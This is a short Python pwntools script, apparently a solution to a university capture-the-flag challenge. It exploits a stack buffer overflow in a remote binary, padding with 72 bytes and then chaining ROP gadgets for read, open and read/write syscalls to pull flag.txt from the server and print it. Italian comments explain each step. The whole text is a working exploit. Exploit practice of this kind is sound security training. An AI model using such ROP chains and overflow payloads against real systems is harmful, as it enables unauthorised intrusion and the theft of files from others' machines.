from pwn import *

REMOTE = True

IP_ADDRESS = "cyberchallenge.disi.unitn.it"
PORT = 9202

if(REMOTE):
    conn = remote(IP_ADDRESS, PORT)
else:
    conn = process('./bin')

offset = 72
payload = b"A" * offset

mov_rax_0_syscall = 0x000000000040119c      #: mov rax, 0; syscall; ret; 
mov_rax_1_syscall = 0x00000000004011a6      #: mov rax, 1; syscall; ret; 
mov_rax_2_syscall = 0x00000000004011b0      #: mov rax, 2; syscall; ret; 

pop_rbp = 0x000000000040111d    #: pop rbp; ret; 
pop_rdi = 0x0000000000401196    #: pop rdi; ret; 
pop_rdx = 0x000000000040119a    #: pop rdx; ret; 
pop_rsi = 0x0000000000401198    #: pop rsi; ret; 
syscall = 0x00000000004011a3    #: syscall; ret;

write_address = 0x0000000000404020

file_name = "flag.txt\x00"                      # Ricorda sempre il \x00 finale

payload += p64(pop_rdi) + p64(0)                # Leggo da STDIN e scrivo il nome del file da aprire in memoria
payload += p64(pop_rsi) + p64(write_address)    
payload += p64(pop_rdx) + p64(len(file_name))                
payload += p64(mov_rax_0_syscall)

payload += p64(pop_rdi) + p64(write_address)    # Apro il file flag.txt
payload += p64(pop_rsi) + p64(0)
payload += p64(pop_rdx) + p64(0)
payload += p64(mov_rax_2_syscall)               # Il file aperto, avrà come fd il fd più alto fino al momento + 1

# Non sappiamo con certezza quale sarà il fd. Partiamo da 3 (i primi 3 sono rispettivamente STDIN, STDOUT e STDERR) e saliamo

payload += p64(pop_rdi) + p64(6)                # Leggo dal file e scrivo in memoria il contenuto del file
payload += p64(pop_rsi) + p64(write_address)
payload += p64(pop_rdx) + p64(40)
payload += p64(mov_rax_0_syscall)

payload += p64(pop_rdi) + p64(1)                # Scrivo dalla memoria allo STDOUT il contenuto del file
payload += p64(pop_rsi) + p64(write_address)
payload += p64(pop_rdx) + p64(40)
payload += p64(mov_rax_1_syscall)

conn.sendline(payload)

conn.send(file_name.encode())

flag = conn.recvline().decode()

conn.close()
print(flag)